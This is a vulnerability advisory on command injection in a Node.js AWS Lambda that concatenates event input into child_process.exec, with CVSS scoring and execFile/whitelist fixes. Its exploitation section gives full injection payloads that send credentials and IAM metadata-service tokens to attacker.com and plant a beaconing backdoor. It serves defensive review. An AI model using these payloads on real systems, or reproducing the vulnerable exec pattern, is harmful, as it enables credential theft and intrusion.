# Command Injection in AWS Lambda via Unsanitized Child Process Execution

# Vulnerability Case
During a recent code review of an AWS Lambda function implemented in Node.js, we discovered that the function constructs shell command strings using unsanitized input from event parameters. Specifically, the Lambda function leverages the Node.js `child_process` module to execute system commands, where user-controlled data is concatenated into the command without proper whitelisting or validation. This pattern introduces a command injection vulnerability, as malicious actors could manipulate the input to execute arbitrary commands. The vulnerability was identified through static analysis of the Lambda deployment pipeline, highlighting potential exploitation in production environments running on AWS infrastructure.

```javascript
// lambda-handler.js
'use strict';
const { exec } = require('child_process');

exports.handler = async (event) => {
  // Potentially unsafe: user-supplied input directly concatenated into the command.
  const userInput = event.directory;
  // Constructing the command using non-literal values
  const archiveCommand = `tar -czf /tmp/backup.tgz ${userInput}`;
  console.log('Executing command:', archiveCommand);
  
  exec(archiveCommand, (error, stdout, stderr) => {
    if (error) {
      console.error(`Execution error: ${error}`);
      return;
    }
    console.log(`Stdout: ${stdout}`);
    console.error(`Stderr: ${stderr}`);
  });
  
  return {
    statusCode: 200,
    body: JSON.stringify({ message: 'Backup process initiated.' }),
  };
};
```

The vulnerability arises from the direct insertion of the `event.directory` value into the shell command string. In an environment like AWS Lambda—running on a Node.js stack—this design flaw allows an attacker to manipulate the command string by providing specially crafted inputs, potentially appending malicious commands using shell metacharacters (e.g., `;` or `&&`). Exploitation could lead to arbitrary command execution on the underlying host, exposing sensitive data, bypassing application controls, or causing service disruption. The business impact includes data compromise, operational downtime, and escalated security risks, especially given the cloud-hosted, event-driven nature of the vulnerable function.


context: javascript.aws-lambda.security.detect-child-process.detect-child-process Allowing spawning arbitrary programs or running shell processes with arbitrary arguments may end up in a command injection vulnerability. Try to avoid non-literal values for the command string. If it is not possible, then do not let running arbitrary commands, use a white list for inputs.

# Vulnerability Breakdown
This vulnerability involves command injection in an AWS Lambda function where user-controlled input is directly concatenated into shell commands without validation or sanitization.

1. **Key vulnerability elements**:
   - Node.js Lambda function uses `child_process.exec()` to execute shell commands
   - User input (`event.directory`) is directly concatenated into the command string
   - No input validation, sanitization, or escaping of potentially dangerous characters
   - Shell metacharacters (`;`, `&&`, `|`, etc.) in input can inject arbitrary commands
   - Execution occurs with Lambda function's AWS IAM permissions

2. **Potential attack vectors**:
   - API Gateway or other AWS services triggering the Lambda with crafted payloads
   - Malicious input containing shell metacharacters to chain commands
   - Exploitation of Lambda's AWS environment and access to AWS metadata service
   - Utilizing Lambda's network access for further attacks

3. **Severity assessment**:
   - High confidentiality impact due to potential data exposure
   - High integrity impact from potential data modification
   - High availability impact from possible disruption
   - Network attack vector allowing remote exploitation
   - Low complexity to exploit requiring basic shell injection knowledge

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

# Description
A critical command injection vulnerability has been identified in an AWS Lambda function that uses the Node.js `child_process.exec()` method to execute shell commands with unsanitized user input. The vulnerability allows attackers to inject arbitrary commands by manipulating the `event.directory` parameter, which is directly concatenated into a shell command string without validation.

```javascript
const archiveCommand = `tar -czf /tmp/backup.tgz ${userInput}`;
exec(archiveCommand, ...)

```

This insecure pattern enables attackers to append malicious commands using shell metacharacters (like semicolons, pipes, or ampersands), potentially leading to unauthorized command execution within the Lambda environment. Given that Lambda functions typically run with specific IAM permissions, this vulnerability could allow attackers to access sensitive data, manipulate AWS resources, or pivot to other services within the AWS infrastructure.

# CVSS
**Score**: 9.8 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \
**Severity**: Critical

The Critical severity rating (9.8) is justified by the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely by anyone able to trigger the Lambda function (typically through API Gateway or other AWS event sources).

- **Low Attack Complexity (AC:L)**: Exploitation is straightforward, requiring only basic knowledge of shell injection techniques. No special circumstances or conditions need to exist for the attack to succeed.

- **No Privileges Required (PR:N)**: An attacker needs no special privileges beyond the ability to invoke the Lambda function, which is typically exposed as a public API endpoint.

- **No User Interaction (UI:N)**: The vulnerability can be exploited without any action from users or administrators.

- **Unchanged Scope (S:U)**: While the impact is limited to the Lambda environment, this is still significant given Lambda's IAM permissions and access to AWS infrastructure.

- **High Confidentiality Impact (C:H)**: The attacker can execute arbitrary commands that could access sensitive data within the Lambda environment, including environment variables, temporary files, and potentially AWS credentials.

- **High Integrity Impact (I:H)**: Command injection allows the attacker to create, modify, or delete files within the Lambda environment, potentially altering the function's behavior.

- **High Availability Impact (A:H)**: The attacker could execute resource-intensive commands or delete critical files, causing the Lambda function to fail or timeout.

# Exploitation Scenarios
**Scenario 1: Data Exfiltration**
An attacker invokes the Lambda function with the following payload:
```json
{
  "directory": ". ; curl -X POST --data "$(cat /tmp/credentials)" https://attacker.com/collect"
}

```
This causes the function to first execute `tar -czf /tmp/backup.tgz .` (which is harmless), followed by a command that sends the contents of any credentials file to the attacker's server. The attacker could target AWS credential files, environment variables (by accessing `/proc/self/environ`), or other sensitive data stored in the Lambda environment.

**Scenario 2: AWS Metadata Service Exploitation**
An attacker uses the following input to access the AWS metadata service:
```json
{
  "directory": "/ ; TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/roles && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$(cat /tmp/roles) | curl -X POST --data-binary @- https://attacker.com/aws-creds"
}

```
This extracts temporary AWS credentials from the metadata service and sends them to the attacker, potentially allowing access to other AWS resources with the Lambda's permissions.

**Scenario 3: Persistent Backdoor**
An attacker creates a backdoor that persists across Lambda invocations (within the execution context lifespan):
```json
{
  "directory": ". ; echo 'const http = require("http"); const { exec } = require("child_process"); function backdoor() { try { http.get("http://attacker.com/beacon?id=$(hostname)", () => {}); setTimeout(backdoor, 60000); } catch(e) {} }; backdoor();' > /tmp/backdoor.js && node /tmp/backdoor.js &"
}

```
This creates a script that beacons to the attacker's server and continues running in the background, potentially for hours if the Lambda execution context is reused.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive data processed by the Lambda function
- Potential breach of customer data leading to compliance violations (GDPR, CCPA, etc.)
- Compromise of AWS credentials potentially allowing lateral movement to other AWS services
- Financial impact from unauthorized use of AWS resources or data theft
- Reputational damage from security breach disclosure
- Remediation costs including incident response, forensics, and security improvements
- Potential regulatory penalties and legal liabilities

**Technical Impact:**
- Command execution with the permissions of the Lambda IAM role
- Access to environment variables containing configuration secrets and API keys
- Potential access to AWS metadata service and temporary credentials
- Ability to make outbound network connections to exfiltrate data
- Potential write access to the /tmp directory allowing for temporary persistence
- Capability to invoke other AWS services accessible to the Lambda's IAM role
- Possible disruption of Lambda functionality through resource exhaustion
- Logs manipulation to hide evidence of compromise
- Ability to modify function behavior within the current execution context

# Technical Details
The vulnerability stems from unsanitized user input being directly incorporated into a shell command executed via Node.js `child_process.exec()`. This function passes its command string to a shell interpreter (/bin/sh), which means special characters have significant meaning.

```javascript
// Vulnerable code pattern
const { exec } = require('child_process');

exports.handler = async (event) => {
  const userInput = event.directory;
  const archiveCommand = `tar -czf /tmp/backup.tgz ${userInput}`;
  
  exec(archiveCommand, (error, stdout, stderr) => {
    // Error handling code...
  });
  
  // Rest of function...
};

```

**Exploitation Mechanics:**

The vulnerability can be exploited by injecting shell metacharacters into the `directory` parameter:

1. **Command chaining**: Using `;` to execute multiple commands
   ```
   normal_input ; malicious_command
   
```

2. **Command substitution**: Using `$()` or backticks
   ```
   normal_input $(malicious_command)
   
```

3. **Logical operators**: Using `&&` or `||`
   ```
   normal_input && malicious_command
   
```

4. **Pipelines**: Using `|` to pipe output
   ```
   normal_input | malicious_command
   
```

**Execution Environment Considerations:**

AWS Lambda provides a unique execution context:

1. **Filesystem access**: The function has write access to `/tmp` (up to 512MB)
2. **Network access**: By default, Lambda functions can make outbound connections
3. **Metadata service**: Lambda can access the AWS metadata service at `169.254.169.254`
4. **IAM permissions**: Commands execute with the Lambda's IAM role permissions
5. **Execution context reuse**: Long-running processes might persist across invocations

**Attack Limitations:**

1. **Time constraint**: Lambda functions have a maximum execution time (default 3 seconds, up to 15 minutes)
2. **Memory limitation**: Lambda has limited memory (128MB to 10GB)
3. **Read-only filesystem**: Apart from `/tmp`, the filesystem is read-only
4. **Ephemeral execution context**: The execution environment is destroyed eventually

The impact is especially severe because AWS Lambda functions often have privileged IAM permissions to interact with other AWS services, and typically process sensitive application data.

# Remediation Steps
## Use execFile Instead of exec

**Priority**: P0

Replace the `exec()` function with `execFile()`, which doesn't invoke a shell and therefore doesn't interpret shell metacharacters:

```javascript
const { execFile } = require('child_process');

exports.handler = async (event) => {
  // Validate input first (see P1 remediation)
  const userInput = event.directory;
  
  return new Promise((resolve, reject) => {
    execFile('tar', ['-czf', '/tmp/backup.tgz', userInput], (error, stdout, stderr) => {
      if (error) {
        console.error(`Execution error: ${error}`);
        reject({
          statusCode: 500,
          body: JSON.stringify({ message: 'Backup process failed.' })
        });
        return;
      }
      
      console.log(`Stdout: ${stdout}`);
      console.error(`Stderr: ${stderr}`);
      
      resolve({
        statusCode: 200,
        body: JSON.stringify({ message: 'Backup process completed.' })
      });
    });
  });
};

```

This approach separates the command from its arguments, preventing shell injection. The command is executed directly without invoking a shell interpreter, making it immune to shell metacharacter attacks.
## Implement Input Validation with Whitelisting

**Priority**: P1

Add strict validation for the directory parameter using a whitelist approach:

```javascript
const { execFile } = require('child_process');
const path = require('path');

// Whitelist of allowed directories
const ALLOWED_DIRECTORIES = [
  'uploads',
  'documents',
  'images',
  'temp'
];

exports.handler = async (event) => {
  const userInput = event.directory;
  
  // Validate against whitelist
  if (!userInput || !ALLOWED_DIRECTORIES.includes(userInput)) {
    return {
      statusCode: 400,
      body: JSON.stringify({ 
        message: 'Invalid directory. Must be one of: ' + ALLOWED_DIRECTORIES.join(', ') 
      })
    };
  }
  
  // Use path.join to safely construct paths
  const targetDir = path.join('/var/task', userInput);
  
  return new Promise((resolve, reject) => {
    execFile('tar', ['-czf', '/tmp/backup.tgz', targetDir], (error, stdout, stderr) => {
      // Error handling and response code...
    });
  });
};

```

This implementation:
1. Defines an explicit whitelist of allowed directories
2. Validates user input against the whitelist
3. Uses `path.join()` to safely construct paths
4. Combines with the P0 fix to use `execFile()` instead of `exec()`


# References
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-88 | [Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')](https://cwe.mitre.org/data/definitions/88.html)
